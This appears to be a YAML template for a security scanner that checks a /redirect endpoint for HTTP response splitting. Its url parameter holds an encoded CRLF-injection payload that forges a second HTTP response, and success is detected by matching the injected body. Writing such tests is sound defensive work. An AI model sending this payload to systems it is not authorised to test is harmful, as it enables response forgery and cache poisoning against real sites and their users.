name: HTTP响应拆分测试
description: 测试HTTP响应拆分漏洞
level: 中
author: Test
request:
  method: GET
  path: /redirect
  params:
    url: "http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shipped</html>"
  headers:
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
response:
  matchType: contains
  successIndicators:
    - "Shipped"
    - "<html>Shipped</html>"
  errorIndicators:
    - "invalid redirect"
    - "redirect failed"
    - "重定向失败"
  statusCode: 200